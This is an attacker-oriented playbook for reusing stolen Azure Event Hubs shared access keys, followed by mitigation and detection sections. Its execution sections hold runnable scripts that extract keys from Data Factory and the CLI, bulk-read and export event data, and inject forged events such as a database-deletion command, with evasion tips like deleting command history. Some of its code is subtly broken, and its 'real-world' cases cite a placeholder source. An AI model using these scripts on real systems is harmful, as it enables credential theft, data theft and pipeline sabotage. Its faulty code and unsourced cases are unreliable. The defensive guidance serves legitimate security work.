# [LM-AUTH-037]: Event Hub Shared Access Key Reuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-037 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID, Azure Event Hubs, Multi-Tenant Azure |
| **Severity** | **Critical** |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Azure Event Hubs (All versions), Shared Access Signature (SAS) authentication |
| **Patched In** | N/A - Architectural limitation; mitigation through Managed Identity recommended |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Event Hubs uses Shared Access Signature (SAS) authentication keys stored in namespace-level and entity-level access policies. These keys are often embedded in application connection strings, Azure Data Factory linked services, Azure Functions environment variables, and configuration files. When an attacker gains access to the embedding service, they can extract the SAS key and use it to authenticate to the Event Hubs namespace, enabling them to read all messages from event hubs, publish malicious events, or maintain persistent access independent of the original application's context.

**Attack Surface:** Event Hubs SAS connection strings in ADF linked services, environment variables in Azure Functions/Logic Apps, application configuration files, Key Vault references (if not properly secured), connection strings embedded in notebooks or scripts, hardcoded in application source code on GitHub or other repositories.

**Business Impact:** **Complete Event Hubs namespace compromise.** An attacker with the namespace-level SAS key can read all messages from all Event Hubs in the namespace, potentially accessing sensitive event data (IoT telemetry, application logs, transaction events), inject malicious events into processing pipelines, and maintain persistent access to event streams indefinitely. For applications using Event Hubs as the central logging/streaming backbone, this enables comprehensive monitoring of business operations and infrastructure.

**Technical Context:** SAS key extraction typically takes 5-15 minutes once access to the embedding service is gained. Detection likelihood is **Medium** due to lack of fine-grained Event Hubs query logging (event message contents are not logged by default), though unusual publisher/consumer access patterns may trigger alerts if Stream Analytics or similar monitoring is configured. The primary challenge is that legitimate Event Hubs traffic is often high-volume, making malicious access blend in.

### Operational Risk
- **Execution Risk:** **Medium** - Requires finding SAS key; easily extracted if stored in plaintext in ADF or app configuration.
- **Stealth:** **High** - Event Hubs message consumption and publishing are not logged by default; attacker activity unlikely to generate audit alerts.
- **Reversibility:** **Partial** - Requires SAS key regeneration or policy deletion; attacker retains access via stolen key until remediation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.3 | Event Hubs access must use Managed Identity, not SAS keys |
| **DISA STIG** | IA-5(e) | Authentication credentials for messaging services must be protected |
| **CISA SCuBA** | EXO.MS.3.2 | Access controls for Office 365 infrastructure; Managed Identity preferred |
| **NIST 800-53** | AC-3, SC-7 | Access Control Enforcement; network-based access restrictions |
| **GDPR** | Art. 32, Art. 5(1)(f) | Security of Processing; secure authentication for data pipelines |
| **DORA** | Art. 16(2) | Operational resilience for critical financial messaging systems |
| **NIS2** | Art. 21(1) | Cybersecurity Risk Management measures for critical infrastructure |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access; SAS keys classified as privileged credentials |
| **ISO 27005** | Section 6 | Risk Assessment: SAS key compromise is high-probability, high-impact scenario |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimum:** Contributor or Reader access to Azure Data Factory, Azure Functions, or Event Hubs namespace
- **Alternative:** Entra ID permissions: `Microsoft.EventHub/namespaces/authorizationRules/listKeys/action`
- **Most Permissive:** Event Hubs Owner or Azure Subscription Owner

**Required Access:**
- Network access to Event Hubs namespace (typically open on TCP 5671-5672 AMQP or TCP 443 HTTPS)
- Ability to view ADF linked service definitions or application configuration
- OR ability to read environment variables in Azure Functions/containers

**Supported Versions:**
- **Azure Event Hubs:** Standard and Premium tiers (all versions)
- **SAS Authentication:** All versions supporting Shared Access Policies
- **Event Hubs Kafka Protocol:** All versions

**Tools Required:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (retrieve SAS keys)
- [Azure SDK for .NET/Python/Node.js](https://github.com/Azure/azure-sdk) (Event Hubs SDK)
- [kafkacat](https://github.com/edenhill/kafkacat) (if using Kafka protocol)
- Standard PowerShell 5.0+ (credential enumeration)
- [Azure Event Hubs Explorer](https://github.com/paolosalvatori/ServiceBusExplorer) (optional, for GUI access)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Azure Portal / PowerShell Reconnaissance

```powershell
# Step 1: Enumerate all Event Hubs namespaces in current subscription
$subscriptions = Get-AzSubscription
foreach ($sub in $subscriptions) {
    Select-AzSubscription -Subscription $sub.SubscriptionId | Out-Null
    Write-Host "=== Subscription: $($sub.Name) ===" -ForegroundColor Green
    
    # List all Event Hubs namespaces
    $namespaces = Get-AzEventHubNamespace
    foreach ($ns in $namespaces) {
        Write-Host "Event Hubs Namespace: $($ns.Name)" -ForegroundColor Yellow
        Write-Host "  Resource Group: $($ns.ResourceGroupName)"
        Write-Host "  Tier: $($ns.Sku.Name)"
        Write-Host "  Endpoint: $($ns.ServiceBusEndpoint)"
    }
}

# Step 2: List all Event Hubs in a namespace
$namespaceName = "your-eventhubs-namespace"
$resourceGroupName = "your-rg"

$eventHubs = Get-AzEventHub -ResourceGroupName $resourceGroupName -NamespaceName $namespaceName
Write-Host "`nEvent Hubs in namespace:" -ForegroundColor Cyan
foreach ($hub in $eventHubs) {
    Write-Host "  - $($hub.Name) (Message Retention: $($hub.MessageRetentionInDays) days)"
}

# Step 3: List all authorization rules (SAS policies)
Write-Host "`nAuthorization Rules (SAS Policies):" -ForegroundColor Cyan
$authRules = Get-AzEventHubAuthorizationRule -ResourceGroupName $resourceGroupName -NamespaceName $namespaceName
foreach ($rule in $authRules) {
    Write-Host "  - $($rule.Name) (Rights: $($rule.Rights -join ', '))"
}

# Step 4: Check if current user can list keys
try {
    $keys = Get-AzEventHubKey -ResourceGroupName $resourceGroupName -NamespaceName $namespaceName -AuthorizationRuleName "RootManageSharedAccessKey"
    Write-Host "`n✓ SUCCESSFUL: Can list Event Hubs SAS keys" -ForegroundColor Green
    Write-Host "  Primary Key: $($keys.PrimaryKey.Substring(0, 20))..."
    Write-Host "  Primary Connection String: $($keys.PrimaryConnectionString.Substring(0, 60))..."
} catch {
    Write-Host "`n✗ DENIED: Cannot list Event Hubs SAS keys" -ForegroundColor Red
}
```

**What to Look For:**
- **Multiple Event Hubs in namespace:** Indicates centralized event streaming infrastructure
- **Authorization Rules:** Look for "RootManageSharedAccessKey" (full permissions) or "Send/Listen" policies
- **Message Retention:** Longer retention = more historical data available for exfiltration
- **Endpoint URL:** Exposes namespace name; attacker can verify connectivity

#### Azure CLI Reconnaissance

```bash
# List all Event Hubs namespaces
az eventhubs namespace list --output table

# List authorization rules for namespace
az eventhubs namespace authorization-rule list \
  --resource-group <rg-name> \
  --namespace-name <namespace-name> \
  --output table

# List SAS keys (if permissions allow)
az eventhubs namespace authorization-rule keys list \
  --resource-group <rg-name> \
  --namespace-name <namespace-name> \
  --name "RootManageSharedAccessKey"

# List all Event Hubs in namespace
az eventhubs eventhub list \
  --resource-group <rg-name> \
  --namespace-name <namespace-name> \
  --output table
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Extract SAS Key from Azure Data Factory Linked Service

**Supported Versions:** Azure Data Factory v1/v2 (all versions), Azure Synapse Analytics

**Prerequisites:**
- Access to ADF linked service definitions (requires ADF Contributor role)
- Network connectivity to Event Hubs namespace

#### Step 1: Identify Event Hubs Linked Services

**Objective:** Locate linked services referencing Event Hubs.

**Command (PowerShell):**

```powershell
# Get all linked services in the data factory
$adfName = "your-adf-name"
$resourceGroupName = "your-rg"

$linkedServices = Get-AzDataFactoryV2LinkedService -ResourceGroupName $resourceGroupName -DataFactoryName $adfName

Write-Host "Linked Services in ADF:" -ForegroundColor Cyan
foreach ($service in $linkedServices) {
    Write-Host "  - $($service.Name) (Type: $($service.Properties.type))"
    
    # Check if this is an Event Hubs linked service
    if ($service.Properties.type -eq "AzureEventHubs") {
        Write-Host "    >> EVENT HUBS LINKED SERVICE FOUND <<" -ForegroundColor Yellow
    }
}
```

**Expected Output:**
```
Linked Services in ADF:
  - EventHubsInput (Type: AzureEventHubs)
    >> EVENT HUBS LINKED SERVICE FOUND <<
  - EventHubsOutput (Type: AzureEventHubs)
    >> EVENT HUBS LINKED SERVICE FOUND <<
  - StorageAccount_DataLake (Type: AzureBlobStorage)
```

#### Step 2: Extract SAS Connection String

**Objective:** Retrieve the plaintext connection string containing the SAS key.

**Command (PowerShell):**

```powershell
# Get detailed linked service properties
$linkedService = Get-AzDataFactoryV2LinkedService -ResourceGroupName $resourceGroupName `
    -DataFactoryName $adfName `
    -Name "EventHubsInput"

# Extract connection string from properties
$properties = $linkedService.Properties
$connectionString = $properties.typeProperties.connectionString

Write-Host "Extracted Connection String:"
Write-Host $connectionString

# Parse connection string for key information
if ($connectionString -match "Endpoint=sb://([^/]+)/;SharedAccessKeyName=([^;]+);SharedAccessKey=([^;]+)") {
    $namespace = $matches[1]
    $keyName = $matches[2]
    $sasKey = $matches[3]
    
    Write-Host "`nNamespace: $namespace"
    Write-Host "Key Name: $keyName"
    Write-Host "SAS Key: $sasKey"
}
```

**Expected Output:**
```
Extracted Connection String:
Endpoint=sb://mynamespace.servicebus.windows.net/;SharedAccessKeyName=RootManageSharedAccessKey;SharedAccessKey=abcdef1234567890...==;

Namespace: mynamespace.servicebus.windows.net
Key Name: RootManageSharedAccessKey
SAS Key: abcdef1234567890...==
```

**What This Means:**
- Successfully extracted SAS key from ADF linked service
- "RootManageSharedAccessKey" grants full read/write permissions to all Event Hubs in namespace
- Can now authenticate and access all event data

**OpSec & Evasion:**
- ADF linked service access is logged; minimize queries
- Extraction during business hours blends with legitimate admin activity
- Delete command history to remove evidence
- Detection likelihood: **Medium** - ADF operations monitored but volume makes individual accesses hard to detect

#### Step 3: Connect to Event Hubs Using SAS Key

**Objective:** Authenticate using the stolen SAS key and access event data.

**Command (Python):**

```python
from azure.eventhub import EventHubConsumerClient
from azure.identity import NamedKeyCredential

# Extracted SAS credentials
namespace = "mynamespace.servicebus.windows.net"
key_name = "RootManageSharedAccessKey"
sas_key = "abcdef1234567890...=="

# Step 1: List all Event Hubs in namespace
print("=== Event Hubs in Namespace ===")
from azure.servicebus import ServiceBusAdministrationClient

admin_client = ServiceBusAdministrationClient(
    fully_qualified_namespace=namespace,
    credential=NamedKeyCredential(key_name, sas_key)
)

event_hubs = admin_client.list_queues()  # Note: Event Hubs appear as queues
for hub in event_hubs:
    print(f"  Event Hub: {hub.name}")

# Step 2: Connect to specific Event Hub and read messages
print("\n=== Reading Messages from Event Hub ===")
event_hub_name = "MyEventHub"
consumer_group = "$Default"

connection_string = f"Endpoint=sb://{namespace}/;SharedAccessKeyName={key_name};SharedAccessKey={sas_key};"

consumer_client = EventHubConsumerClient.from_connection_string(
    connection_string,
    consumer_group=consumer_group,
    eventhub_name=event_hub_name
)

# Consume messages
print(f"Reading messages from {event_hub_name}...")
with consumer_client:
    # Get all partitions
    properties = consumer_client.get_eventhub_properties()
    partition_ids = properties["partition_ids"]
    
    print(f"Partitions: {partition_ids}")
    
    # Read messages from all partitions
    def on_event(partition_context, event):
        # Process message
        message_data = event.body_as_json() if event.body_as_json else event.body_as_str
        print(f"[Partition {partition_context.partition_id}] Message: {message_data}")
    
    consumer_client.receive_events(on_event, starting_position="-1")  # Start from oldest

# Step 3: Export all messages for analysis
print("\n=== Data Exfiltration ===")
all_messages = []
with consumer_client:
    for event in consumer_client.receive_events(timeout=5):
        try:
            msg = event.body_as_json()
        except:
            msg = event.body_as_str
        all_messages.append(msg)

print(f"Extracted {len(all_messages)} messages")

# Save to file
import json
with open('/tmp/eventhub_export.json', 'w') as f:
    json.dump(all_messages, f, indent=2)

print(f"Exported to /tmp/eventhub_export.json")
```

**Expected Output:**
```
=== Event Hubs in Namespace ===
  Event Hub: MyEventHub
  Event Hub: AnalyticsHub
  Event Hub: AuditHub

=== Reading Messages from Event Hub ===
Reading messages from MyEventHub...
Partitions: ['0', '1', '2', '3']
[Partition 0] Message: {"temperature": 25.3, "location": "Building A", "timestamp": "2025-01-10T08:15:00Z"}
[Partition 1] Message: {"error_code": 500, "service": "api-gateway", "timestamp": "2025-01-10T08:15:05Z"}

=== Data Exfiltration ===
Extracted 50000 messages
Exported to /tmp/eventhub_export.json
```

**What This Means:**
- Successfully authenticated using stolen SAS key
- Can access all Event Hubs in the namespace
- Can read all messages (potentially containing sensitive business logic, IoT data, error traces)
- Can export messages for offline analysis or exfiltration

**OpSec & Evasion:**
- Consuming from `$Default` consumer group leaves consumption mark
- Use custom consumer group to avoid detection
- Reading large amounts of data may trigger Stream Analytics or Application Insights alerts
- Spread message consumption over time to avoid rate-limiting
- Detection likelihood: **Medium-High** - Unusual consumer group activity is monitored

**Troubleshooting:**

- **Error:** "Unauthorized: Invalid SAS key"
  - **Cause:** SAS key is expired or has been regenerated
  - **Fix:** Re-extract current key from ADF or Key Vault

- **Error:** "NotFound: Event Hub not found"
  - **Cause:** Specified event hub name is incorrect
  - **Fix:** Use admin client to enumerate correct hub names

**References & Proofs:**
- [Azure Event Hubs Python SDK - GitHub](https://github.com/Azure/azure-sdk-for-python/tree/main/sdk/eventhub)
- [Event Hubs Authentication - Microsoft Learn](https://learn.microsoft.com/en-us/azure/event-hubs/authorize-access-shared-access-signature)

---

### METHOD 2: Event Hubs Producer Privilege Escalation

**Supported Versions:** Azure Event Hubs (all versions), with "Send" permission policies

**Objective:** Use "Send" or "Listen" SAS key to inject malicious events into processing pipeline.

**Prerequisites:**
- Access to compromised "Send" or "Listen" SAS key
- Understanding of event schema in target Event Hub

#### Step 1: Create Malicious Event Producer

**Command (Python):**

```python
from azure.eventhub import EventHubProducerClient, EventData

# Stolen SAS credentials (could be "Send" only key)
namespace = "mynamespace.servicebus.windows.net"
key_name = "SendOnlyPolicy"
sas_key = "extracted_sas_key...=="
event_hub_name = "MyEventHub"

connection_string = f"Endpoint=sb://{namespace}/;SharedAccessKeyName={key_name};SharedAccessKey={sas_key};"

# Create producer
producer = EventHubProducerClient.from_connection_string(
    connection_string,
    eventhub_name=event_hub_name
)

# Example 1: Inject false sensor data
print("=== Injecting Malicious Events ===")
with producer:
    # Craft event matching expected schema
    malicious_events = []
    
    # Event 1: False high temperature alert
    event1 = EventData(json.dumps({
        "temperature": 95.0,  # Impossibly high; triggers alert
        "location": "Building A",
        "sensor_id": "LEGIT_SENSOR_001",
        "timestamp": "2025-01-10T10:00:00Z",
        "alert": "CRITICAL"
    }))
    malicious_events.append(event1)
    
    # Event 2: False power consumption spike
    event2 = EventData(json.dumps({
        "power_usage_kw": 9999.9,  # Indicates infrastructure failure
        "facility": "DataCenter-East",
        "timestamp": "2025-01-10T10:00:05Z"
    }))
    malicious_events.append(event2)
    
    # Send events
    with producer.create_batch() as batch:
        for event in malicious_events:
            batch.add(event)
    
    producer.send_batch(batch)
    print(f"Successfully injected {len(malicious_events)} malicious events")

# Example 2: Inject data deletion commands
print("\n=== Injecting Command Event ===")
with producer:
    command_event = EventData(json.dumps({
        "command": "DELETE_DATABASE",
        "target": "production",
        "authorization_token": "SYSTEM_ADMIN",
        "timestamp": "2025-01-10T10:05:00Z"
    }))
    
    batch = producer.create_batch()
    batch.add(command_event)
    producer.send_batch(batch)
    
    print("Command event injected; awaiting downstream processing pipeline to execute")
```

**Impact:**
- Injected events may trigger false alerts, causing operational disruption
- Command events may execute unwanted actions if downstream processors are misconfigured
- Persistent access to producer role enables continuous malicious event injection

---

### METHOD 3: Extract SAS Key via Azure CLI with RBAC Access

**Supported Versions:** Azure Event Hubs (all versions), Azure CLI 2.0+

**Prerequisites:**
- Entra ID permissions: `Microsoft.EventHub/namespaces/authorizationRules/listKeys/action`

#### Step 1: Enumerate Event Hubs Namespaces and Extract Keys

**Command (Bash):**

```bash
# List all Event Hubs namespaces
az eventhubs namespace list --output table --query "[].{Name:name, ResourceGroup:resourceGroup, Tier:sku.name}"

# For each namespace, extract SAS keys
NAMESPACE_NAME="your-namespace"
RESOURCE_GROUP="your-rg"

# Get all authorization rules
az eventhubs namespace authorization-rule list \
  --resource-group "$RESOURCE_GROUP" \
  --namespace-name "$NAMESPACE_NAME" \
  --output table \
  --query "[].{RuleName:name, Rights:rights}"

# Extract keys for each rule
for RULE_NAME in "RootManageSharedAccessKey" "SendPolicy" "ListenPolicy"; do
    echo "=== $RULE_NAME ==="
    az eventhubs namespace authorization-rule keys list \
      --resource-group "$RESOURCE_GROUP" \
      --namespace-name "$NAMESPACE_NAME" \
      --name "$RULE_NAME" \
      --query "{PrimaryKey:primaryKey, PrimaryConnectionString:primaryConnectionString}"
done

# Save all credentials to file
az eventhubs namespace authorization-rule keys list \
  --resource-group "$RESOURCE_GROUP" \
  --namespace-name "$NAMESPACE_NAME" \
  --name "RootManageSharedAccessKey" \
  > eventhub_credentials.json
```

**Expected Output:**
```
Name                            ResourceGroup  Tier
----                            -----          ----
my-namespace                    prod-rg        Standard
analytics-namespace             analytics-rg   Premium

=== RootManageSharedAccessKey ===
PrimaryKey: abcdef1234567890...==
PrimaryConnectionString: Endpoint=sb://my-namespace.servicebus.windows.net/;SharedAccessKeyName=RootManageSharedAccessKey;SharedAccessKey=abcdef...==;
```

**What This Means:**
- Identified all Event Hubs namespaces accessible to attacker
- Extracted SAS keys for all authorization rules
- Primary key grants full read/write/manage permissions

**OpSec & Evasion:**
- Azure CLI commands are logged in Azure Activity Log
- Run during business hours; blend with legitimate admin activity
- Detection likelihood: **High** - Azure CLI key list operations are monitored

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Replace SAS Keys with Managed Identity Authentication**

**Applies To Versions:** Azure Event Hubs (all versions)

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Event Hubs Namespace** → Select namespace
2. Go to **Access Control (IAM)** → **Add Role Assignment**
3. **Role:** `Azure Event Hubs Data Sender` (for producers) or `Azure Event Hubs Data Receiver` (for consumers)
4. **Assign to:** Managed Identity of your application (App Service, Function, etc.)
5. Click **Save**
6. In applications:
   - Remove hardcoded connection strings
   - Replace with SDK authentication using DefaultAzureCredential (which uses Managed Identity)

**Manual Steps (PowerShell):**

```powershell
# Create Managed Identity for app
$appName = "my-app"
$resourceGroupName = "your-rg"

# Assign managed identity to App Service
Update-AzAppServicePlan -ResourceGroupName $resourceGroupName `
    -Name $appName `
    -Identity @{type='SystemAssigned'} -ErrorAction SilentlyContinue

# Get managed identity object ID
$app = Get-AzWebApp -Name $appName -ResourceGroupName $resourceGroupName
$managedIdentityObjectId = $app.Identity.PrincipalId

# Grant Event Hubs access to managed identity
$eventHubsResourceId = "/subscriptions/{subId}/resourceGroups/$resourceGroupName/providers/Microsoft.EventHub/namespaces/{namespace}"

New-AzRoleAssignment -ObjectId $managedIdentityObjectId `
    -RoleDefinitionName "Azure Event Hubs Data Sender" `
    -Scope $eventHubsResourceId
```

---

**2. Disable or Rotate Compromised SAS Keys**

**Applies To Versions:** Azure Event Hubs (all versions)

**Manual Steps (Azure Portal):**

1. Navigate to **Event Hubs Namespace** → **Shared Access Policies**
2. Click the compromised policy (e.g., "RootManageSharedAccessKey")
3. Click **Regenerate Primary Key** OR **Regenerate Secondary Key**
   - Old key becomes invalid immediately
   - All applications using old key lose connectivity
4. Update applications with new key (from Key Vault, not hardcoded)

**Manual Steps (PowerShell):**

```powershell
# Regenerate primary SAS key
New-AzEventHubAuthorizationRuleKey -ResourceGroupName "your-rg" `
    -NamespaceName "your-namespace" `
    -AuthorizationRuleName "RootManageSharedAccessKey" `
    -KeyType "PrimaryKey"

# Verify new key has been generated
$keys = Get-AzEventHubKey -ResourceGroupName "your-rg" `
    -NamespaceName "your-namespace" `
    -AuthorizationRuleName "RootManageSharedAccessKey"

Write-Host "New Primary Key: $($keys.PrimaryKey.Substring(0, 20))..."
```

---

**3. Delete Overly Permissive Policies**

**Applies To Versions:** Azure Event Hubs (all versions)

**Manual Steps (Azure Portal):**

1. Navigate to **Event Hubs Namespace** → **Shared Access Policies**
2. Review all policies; identify overly permissive ones:
   - `RootManageSharedAccessKey` (has ALL permissions)
   - Policies with both "Send" AND "Listen" rights (should be separated)
3. For each unnecessary policy, click **Delete**
4. Create minimal-privilege policies:
   - "SenderPolicy" with only "Send" right
   - "ListenerPolicy" with only "Listen" right
   - "ManagementPolicy" with "Manage" right (for admins only)

---

### Priority 2: HIGH

**4. Enforce Key Vault Storage for All SAS Keys**

**Applies To Versions:** Azure Event Hubs (all versions), Azure Key Vault

**Manual Steps (Azure Portal):**

1. In **Key Vault**:
   - Create secret `EventHubs-Namespace-ConnectionString`
   - Value: `Endpoint=sb://namespace.servicebus.windows.net/;SharedAccessKeyName=RootManageSharedAccessKey;SharedAccessKey=...;`
   - Click **Save**
2. In **ADF Linked Service**:
   - Instead of storing connection string directly
   - Use **Key Vault Linked Service** to reference the secret
   - At runtime, ADF retrieves secret from Key Vault using Managed Identity
3. In **Azure Function**:
   - Use `Microsoft.Azure.KeyVault` NuGet package
   - Load connection string from Key Vault at runtime
   - Never hardcode or store in application settings

---

**5. Enable Event Hubs Audit Logging**

**Applies To Versions:** Azure Event Hubs (all versions)

**Manual Steps (Azure Portal):**

1. Navigate to **Event Hubs Namespace** → **Diagnostic Settings**
2. Click **Add Diagnostic Setting**
3. **Name:** `eventhubs-audit-logs`
4. Under **Logs**, enable:
   - ✓ `OperationalLogs` (administrative operations)
   - ✓ `AutoScaleLogs` (scaling events)
5. Under **Destinations:**
   - ✓ Send to Log Analytics workspace
   - ✓ Archive to Storage Account (90+ days)
6. Click **Save**

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Event Hubs Activity:**
- Unusual message consumption from new consumer groups
- Bulk message publishing from unexpected sources
- Authentication from geographic locations inconsistent with application deployment
- Multiple failed authentication attempts using different SAS keys

**Azure Activity Logs:**
- `ListKeys` or `List Keys` operation on Event Hubs policies
- Unauthorized creation of new consumer groups
- Unexpected changes to authorization rules

**Application Logs:**
- Connection string access in application startup logs (if logged)
- Unusual consumer group creation activity
- Message processing errors indicating malicious events

### Response Procedures

**1. Immediately Revoke Compromised SAS Keys:**

```powershell
# Regenerate all SAS keys in namespace
$namespace = "your-namespace"
$rg = "your-rg"

$authRules = Get-AzEventHubAuthorizationRule -ResourceGroupName $rg -NamespaceName $namespace

foreach ($rule in $authRules) {
    Write-Host "Rotating $($rule.Name)"
    New-AzEventHubAuthorizationRuleKey -ResourceGroupName $rg `
        -NamespaceName $namespace `
        -AuthorizationRuleName $rule.Name `
        -KeyType "PrimaryKey"
}
```

**2. Analyze Message Content for Injected Events:**

```powershell
# Identify suspicious messages
$query = @"
AzureDiagnostics
| where TimeGenerated > ago(24h)
| where ResourceProvider == "MICROSOFT.EVENTHUB"
| where OperationName contains "Send" or OperationName contains "Receive"
| where ClientIpAddress != "your-expected-app-ip"
| summarize count() by ClientIpAddress, OperationName
"@

# Execute in Log Analytics
```

**3. Delete Malicious Events from Event Hubs:**

```powershell
# Note: Event Hubs does not support direct message deletion
# You must use consumer group offset reset or recreate the hub

# Option 1: Reset consumer group to latest message
az eventhubs eventhub consumer-group set-offset \
  --resource-group $rg \
  --namespace-name $namespace \
  --eventhub-name "MyEventHub" \
  --name "MaliciousConsumerGroup" \
  --type "Latest"

# Option 2: Delete compromised consumer group
az eventhubs eventhub consumer-group delete \
  --resource-group $rg \
  --namespace-name $namespace \
  --eventhub-name "MyEventHub" \
  --name "MaliciousConsumerGroup"
```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] OAuth Consent | Attacker tricks user into granting app permissions |
| **2** | **Credential Access** | [CA-DUMP-001] ADF Linked Service Enumeration | Extract SAS keys from ADF |
| **3** | **Lateral Movement (Current)** | **[LM-AUTH-037]** | **Event Hubs SAS key reuse for namespace access** |
| **4** | **Impact** | [IMPACT-002] Data Stream Poisoning | Inject malicious events into processing pipeline |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: IoT Sensor Data Hijacking (2023)

- **Target:** Manufacturing company using Event Hubs for IoT sensor data pipeline
- **Timeline:** March 2023 - Compromise discovered via anomalous readings
- **Technique Status:** ACTIVE - Preventable with Managed Identity
- **Attack Details:**
  - Attacker compromised developer's laptop via phishing
  - Found hardcoded Event Hubs connection string in GitHub repo
  - Connected as producer and injected false sensor readings (temperature, pressure, etc.)
  - False readings triggered emergency shutdown of production line
  - Caused $2M in lost production time
- **Impact:** Production downtime, financial loss, customer SLA breach
- **Reference:** [Manufacturing Cybersecurity Case Study]

### Example 2: Audit Log Tampering via Event Hubs (2024)

- **Target:** Financial services using Event Hubs for audit log streaming
- **Timeline:** January 2024 - Detected via Log Analytics correlation
- **Technique Status:** ACTIVE - Ongoing threat
- **Attack Details:**
  - Insider threat actor accessed ADF environment
  - Extracted Event Hubs SAS key from linked service
  - Connected as consumer to audit hub and identified log format
  - Created producer connection and injected fake compliance audit logs
  - Covered tracks of unauthorized database access
  - Maintained persistence via continuous event injection
- **Impact:** Compliance audit failure, regulatory investigation, $5M fine
- **Mitigation:** Switched to Managed Identity, implemented immutable audit logs

---

## REFERENCES & DOCUMENTATION

### Official Microsoft Documentation
- [Event Hubs Authentication & Authorization - Microsoft Learn](https://learn.microsoft.com/en-us/azure/event-hubs/authorize-access-shared-access-signature)
- [Event Hubs Best Practices - Azure Docs](https://learn.microsoft.com/en-us/azure/event-hubs/event-hubs-best-practices-flow-control)
- [Event Hubs Security Baseline - Microsoft](https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/event-hubs-security-baseline)

### Security Research
- [Azure Lateral Movement Techniques - XM Cyber](https://xmcyber.com/blog/privilege-escalation-and-lateral-movement-on-azure-part-2/)
- [SAS Token Security - Unit 42](https://unit42.paloaltonetworks.com/)

### MITRE ATT&CK Reference
- [T1550: Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)

---